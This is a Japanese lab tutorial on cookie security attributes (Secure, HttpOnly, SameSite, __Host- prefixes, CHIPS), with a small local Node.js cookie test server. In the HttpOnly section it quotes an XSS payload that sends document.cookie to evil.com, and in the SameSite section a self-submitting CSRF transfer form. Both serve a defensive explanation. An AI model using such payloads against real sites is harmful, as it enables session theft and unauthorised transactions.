🖥 サーバー側からCookieを返すエンドポイントの追加（推奨）

HttpOnly / Secure / __Host- の本質は「サーバーが Set-Cookie レスポンスヘッダーで返す」ことにあります。 Lab 01 で使用しているNode.jsサーバーに、Cookie設定用のエンドポイントを追加すると実験の体感が大幅に向上します。

セットアップ — cookie-server.js を作成して起動

以下のファイルを C:\Users\user\ClaudeCode\HTTPHeader\cookie-server.js として保存し、別のコマンドプロンプトで起動します。

// cookie-server.js — Lab 05 用 Cookie設定サーバー（ポート7891）
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:7890');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Content-Type', 'application/json; charset=utf-8');

  if (parsed.pathname === '/set-cookies') {
    // HttpOnly Cookie（JSから読めない）
    res.setHeader('Set-Cookie', [
      'server_httponly=秘密の値; Path=/; HttpOnly; Max-Age=300',
      'server_visible=読める値; Path=/; Max-Age=300',
      'server_samesite_lax=lax値; Path=/; SameSite=Lax; Max-Age=300',
      'server_samesite_strict=strict値; Path=/; SameSite=Strict; Max-Age=300'
    ]);
    res.writeHead(200);
    res.end(JSON.stringify({ message: 'Cookies set!', cookies: [
      'server_httponly (HttpOnly)', 'server_visible (通常)',
      'server_samesite_lax (Lax)', 'server_samesite_strict (Strict)'
    ]}));
  } else if (parsed.pathname === '/check-cookies') {
    res.writeHead(200);
    res.end(JSON.stringify({
      received_cookies: req.headers.cookie || '(なし)',
      message: 'サーバーが受け取ったCookieヘッダー'
    }));
  } else if (parsed.pathname === '/clear-cookies') {
    res.setHeader('Set-Cookie', [
      'server_httponly=; Path=/; HttpOnly; Max-Age=0',
      'server_visible=; Path=/; Max-Age=0',
      'server_samesite_lax=; Path=/; Max-Age=0',
      'server_samesite_strict=; Path=/; Max-Age=0'
    ]);
    res.writeHead(200);
    res.end(JSON.stringify({ message: 'All cookies cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
}).listen(7891, () => console.log('Cookie Server: http://127.0.0.1:7891'));
# 起動コマンド（別のコマンドプロンプトで）:
node C:\Users\user\ClaudeCode\HTTPHeader\cookie-server.js
# → Cookie Server: http://127.0.0.1:7891

Cookie のセキュリティ属性 — 脅威と防御の対応

攻撃手法 防御する属性 防御メカニズム ───────────────────────────────────────────────────────────────────── 中間者攻撃（MITM） Secure HTTPS時のみCookieを送信 HTTP通信の盗聴で → HTTP経路でのCookie漏洩を防止 Cookieを傍受 XSS（クロスサイト HttpOnly JSからCookieにアクセス不可 スクリプティング） → document.cookie で読めない 悪意あるスクリプトで → 盗取・外部送信を防止 Cookieを盗取 CSRF（クロスサイト SameSite クロスサイトリクエストで リクエスト偽造） Cookieの自動送信を制限 別サイトから本人の → 意図しない操作を防止 認証情報で操作実行 Cookie固定攻撃 __Host- プレフィックス Secure + Path=/ + Domain未指定 サブドメインから を強制。属性の上書きを防止 Cookie上書き

実験 5-A: Secure — HTTPS でのみ送信

Secure 属性が付いた Cookie は HTTPS 接続時のみ送信されます。 HTTP（平文）ではネットワーク上を流れる際に盗聴可能なため、この属性で防ぎます。

Secure 属性の効果: Set-Cookie: session=abc; Secure https://example.com/page → Cookie 送信される ✅ http://example.com/page → Cookie 送信されない ❌ ← 盗聴防止 なぜ重要か: ┌────────────┐ ┌──────────┐ ┌────────────┐ │ Browser │ ──▶ │ 攻撃者 │ ──▶ │ Server │ │ │ HTTP通信を │ │ │ │ Cookie: │ 盗聴可能 │ │ │ │ session=abc│ │ │ │ └────────────┘ │ └────────────┘ Secure なし: Cookie が丸見え！ Secure あり: HTTP では送信されないので安全

実験 5-B: HttpOnly — JavaScript からのアクセスを禁止

HttpOnly 属性が付いた Cookie は document.cookie で読み取れません。 XSS 攻撃でスクリプトが実行されても、Cookie を盗むことができなくなります。

XSS 攻撃シナリオ（HttpOnly なし）: 1. 攻撃者がサイトの入力欄に悪意あるスクリプトを仕込む <script> fetch('https://evil.com/steal?cookie=' + document.cookie); </script> 2. 被害者がそのページを閲覧 → スクリプトが実行され、document.cookie の値が攻撃者のサーバーに送信される HttpOnly ありの場合: → document.cookie にセッションCookieが含まれない → 攻撃者は Cookie を盗めない！ ただし注意: → HttpOnly は Cookie の「読み取り」を防ぐだけ → Cookie の「送信」自体は防がない（CSRF対策は SameSite が担当）

HttpOnly は JS で設定できない: document.cookie = "name=value; HttpOnly" と書いても効果がありません。 HttpOnly はサーバーが Set-Cookie レスポンスヘッダーで設定する場合にのみ有効です。 これは実験 5-E（OutSystems）で確認します。
HttpOnly の正しい位置づけ: 多層防御の最後の砦（Defense in Depth）:
HttpOnly は Cookie の「読み取り」を防ぎますが、XSS が成功した時点で他の被害（DOM操作、 偽フォーム表示、キーロガー設置等）は防げません。 CSP（Lab 08）でXSS自体を防ぐことが本質的な対策です。
HttpOnly はCSPを突破された場合の最後の防御層として、セッションCookieの盗取だけは防ぎます。 セキュリティは1つの対策に頼るのではなく、複数の層を重ねることが重要です。

実験 5-C: SameSite — CSRF 攻撃を防ぐ

SameSite 属性は、クロスサイトリクエスト（別サイトから発信されたリクエスト）で Cookie を送信するかどうかを制御します。CSRF 攻撃の主要な防御手段です。

CSRF 攻撃シナリオ: 1. ユーザーが bank.com にログイン済み（セッションCookie保持） 2. ユーザーが evil.com を閲覧 3. evil.com に埋め込まれたフォームが bank.com に送金リクエストを送信: <form action="https://bank.com/transfer" method="POST"> <input name="to" value="attacker"> <input name="amount" value="1000000"> </form> <script>document.forms[0].submit();</script> 4. ブラウザが bank.com のセッションCookieを自動送信 → ユーザーの意図しない送金が実行される！ SameSite による防御: SameSite=Strict → evil.com からの全リクエストで Cookie 不送信 SameSite=Lax → evil.com からのPOSTでは Cookie 不送信（GETナビゲーションは許可） SameSite=None → 制限なし（Secure 必須）← サードパーティ埋め込み用
STEP 1 — SameSite の3つの値を比較
値同一サイトリクエストクロスサイト GETナビゲーションクロスサイト POST用途
Strict ✅ 送信 ❌ 不送信 ❌ 不送信 銀行、重要操作
Lax ✅ 送信 ✅ 送信 ❌ 不送信 一般的なセッション（推奨デフォルト）
None ✅ 送信 ✅ 送信 ✅ 送信 サードパーティ埋め込み（Secure必須）
STEP 2 — Strict vs Lax の実務的な違い
SameSite=Strict の問題点:
  外部サイトのリンクから自サイトに遷移した場合も Cookie が送信されない
  → ユーザーがメールのリンクをクリック → ログイン画面が表示される（不便）
  → SNSからのリンク → 毎回ログインが必要（UX悪化）

SameSite=Lax の妥協点:
  トップレベルナビゲーション（リンクのクリック）の GET では Cookie を送信
  → メールのリンク → ログイン済みで表示される ✅
  → ただし POST（フォーム送信）は送信されない → CSRF は防げる ✅
  → 多くの場合、Lax が最適なバランス

SameSite=None; Secure の使用場面:
  サードパーティの iframe 内で Cookie が必要な場合
  → 決済ウィジェット、埋め込みチャット、SSO の iframe 等
  → 必ず Secure と組み合わせること（ないとブラウザが拒否）
  → サードパーティCookieブロック（Safari ITP等）の影響を受ける
Chrome のデフォルト: SameSite を指定しない場合、Chrome はデフォルトで Lax として扱います（2020年〜）。 ただし明示的に設定することが強く推奨されます。
📖 参考: MDN — SameSite
STEP 3 — Partitioned 属性（CHIPS）— SameSite=None の進化形
// SameSite=None でサードパーティCookieを使う場合の問題:
//   サイトA上でも サイトB上でも 同じCookieが送信される
//   → クロスサイトトラッキングに悪用可能

Partitioned（CHIPS）で解決:
  Set-Cookie: __Secure-embed=xyz;
    Path=/; Secure; HttpOnly;
    SameSite=None; Partitioned

  サイトA上での embed Cookie → 「サイトA × embed」として分離保存
  サイトB上での embed Cookie → 「サイトB × embed」として分離保存
  → 同じ名前のCookieでも、トップレベルサイトごとに別物として扱われる
  → クロスサイトトラッキングは不可能に

// 用途:
  決済ウィジェット、埋め込みチャット、SSO iframe 等
  → 「状態保持は必要だが、トラッキングはさせたくない」場合に最適

// ブラウザ対応: Chrome 114+、Edge 114+（2023年〜）

実験 5-D: __Host- / __Secure- プレフィックス — 属性の強制

Cookie 名にプレフィックスを付けることで、特定の属性設定をブラウザが強制します。 サーバー側の設定ミスを防ぐ安全装置です。

__Host- プレフィックス（最も安全）

強制される条件:
  ✅ Secure 属性が必須
  ✅ Path=/ が必須
  ✅ Domain 属性が未指定（省略）

Set-Cookie: __Host-session=abc;
  Path=/; Secure; HttpOnly; SameSite=Lax

効果:
  → サブドメインへの共有を完全に防止
  → Cookie固定攻撃を防止
  → HTTPS以外では設定不可
  → サブドメイン攻撃対策として特に強力
    （admin.example.comが侵害されても
     __Host- Cookie は上書き不可能）

条件を満たさない場合:
  → ブラウザが Cookie を拒否する

__Secure- プレフィックス

強制される条件:
  ✅ Secure 属性が必須

Set-Cookie: __Secure-token=xyz;
  Domain=example.com; Path=/;
  Secure; HttpOnly; SameSite=Lax

効果:
  → HTTPS でのみ設定可能を保証
  → Domain の明示は許可される
    （サブドメイン共有が可能）

__Host- より緩い:
  → Domain共有が必要な場合に使用
STEP 1 — プレフィックスの動作を確認
← ボタンを押すと結果が表示されます
プレフィックスの検証はブラウザが行う: __Host- で始まる Cookie に Domain=example.com を付けると、 ブラウザがその Cookie を無視（拒否）します。サーバー側のエラーではなく、 ブラウザ側で強制される安全装置です。

実務での推奨 Cookie 設定パターン

用途推奨 Set-Cookie理由
セッション管理 __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax 最も安全。XSS盗取防止 + CSRF軽減 + MITM防止 + サブドメイン分離
CSRF トークン __Host-csrf=token; Path=/; Secure; SameSite=Strict HttpOnly なし（JSから読み取ってフォームに埋め込む必要がある）
ユーザー設定
(テーマ, 言語)		 preferences=dark; Path=/; Secure; SameSite=Lax; Max-Age=31536000 HttpOnly 不要（JSから読み取る）。長期保存
サードパーティ埋め込み __Secure-embed=xyz; Path=/; Secure; HttpOnly; SameSite=None; Partitioned SameSite=None + Secure 必須。Partitioned(CHIPS) でトラッキング防止
避けるべき設定パターン:
❌ Set-Cookie: session=abc — 属性なし。全ての攻撃に対して無防備
❌ Set-Cookie: session=abc; Domain=example.com — Domainを広げすぎ。サブドメインのXSSで盗取可能
❌ Set-Cookie: session=abc; SameSite=None — Secure なしの SameSite=None はブラウザが拒否
❌ document.cookie でセッションIDを設定 — HttpOnly が付けられない

補足: CHIPS（Partitioned Cookie）— 2026年の現状

サードパーティCookieの廃止が進む中、Partitioned 属性が事実上の代替手段として定着しています。

Partitioned Cookie の設定例
Set-Cookie: __Host-embed=abc123;
  Secure;
  HttpOnly;
  SameSite=None;
  Partitioned;
  Path=/

// → トップレベルサイトごとに分離保存される
// → クロスサイトトラッキングを防止しつつ、
//   埋め込みウィジェットの状態は保持できる

ブラウザ対応状況（2026年3月）

Safari (ITP): 3rd party Cookie 完全ブロック
Firefox (ETP): デフォルトブロック
Chrome: ユーザーが選択可能
         Incognito ではデフォルトブロック
         Partitioned 対応済み

  + HttpOnly
  + SameSite=Lax（同一サイト用）
  または
  + SameSite=None; Partitioned（埋め込み用）
